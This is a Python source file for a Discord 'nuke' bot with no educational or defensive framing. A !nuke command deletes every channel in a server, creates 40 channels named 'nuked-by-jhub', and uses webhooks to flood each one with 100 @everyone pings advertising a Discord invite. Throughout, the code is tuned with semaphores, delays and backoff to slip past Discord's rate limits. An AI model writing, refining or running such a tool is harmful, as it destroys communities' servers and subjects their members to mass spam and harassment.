import discord
from discord.ext import commands
import os
import aiohttp
import asyncio

# Configuration
prefix = "!"
channel_name = "nuked-by-jhub"
webhook_name = "JHUB ON TOP"
webhook_pfp = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
guild_name = "JHUB ON TOP"
guild_icon = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
channels_to_create = 40
pings_per_channel = 100

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)

@bot.event
async def on_ready():
    print(f"✅ {bot.user} is online and ready.")

async def spam_webhook(webhook):
    backoff = 1
    for i in range(pings_per_channel):
        try:
            await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
            if (i + 1) % 10 == 0:
                print(f"Sent {i + 1} pings in webhook {webhook.name}")
            await asyncio.sleep(0.1)  # Small delay between messages to reduce rate limit hits
            backoff = 1  # reset backoff after success
        except discord.errors.HTTPException as e:
            # Rate limited or other HTTP error
            print(f"Rate limit hit or error sending webhook message: {e}. Backing off {backoff}s.")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 10)  # exponential backoff capped at 10 seconds
        except Exception as e:
            print(f"Unexpected error sending webhook message: {e}")
            break

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    print("⚠️ Starting NUKE sequence...")

    # Delete all channels concurrently but with a small semaphore to avoid bursting
    channels = list(guild.channels)
    print(f"Deleting {len(channels)} channels...")

    sem = asyncio.Semaphore(5)  # limit concurrent deletes to 5

    async def safe_delete(channel):
        async with sem:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            except Exception as e:
                print(f"Failed to delete channel {channel.name}: {e}")

    await asyncio.gather(*(safe_delete(c) for c in channels))

    await asyncio.sleep(2)  # Give Discord some breathing room

    # Create channels one by one with small delay to avoid rate limits
    print(f"Creating {channels_to_create} channels...")

    created_channels = []
    for i in range(channels_to_create):
        try:
            channel = await guild.create_text_channel(f"{channel_name}-{i}")
            created_channels.append(channel)
            print(f"Created channel: {channel.name}")
            await asyncio.sleep(0.4)  # slower channel creation to avoid rate limits
        except Exception as e:
            print(f"Failed to create channel {i}: {e}")

    # Create webhooks for all channels
    webhooks = []
    for channel in created_channels:
        try:
            webhook = await channel.create_webhook(name=webhook_name)
            webhooks.append(webhook)
            print(f"Created webhook in {channel.name}")
            await asyncio.sleep(0.2)
        except Exception as e:
            print(f"Failed to create webhook in {channel.name}: {e}")

    # Start all webhook spam tasks concurrently
    print(f"Starting spam in all channels...")
    spam_tasks = [asyncio.create_task(spam_webhook(wh)) for wh in webhooks]
    await asyncio.gather(*spam_tasks)

    print("✅ NUKE complete.")

if __name__ == "__main__":
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("❌ Error: DISCORD_TOKEN environment variable not found.")
        exit(1)
    bot.run(token)
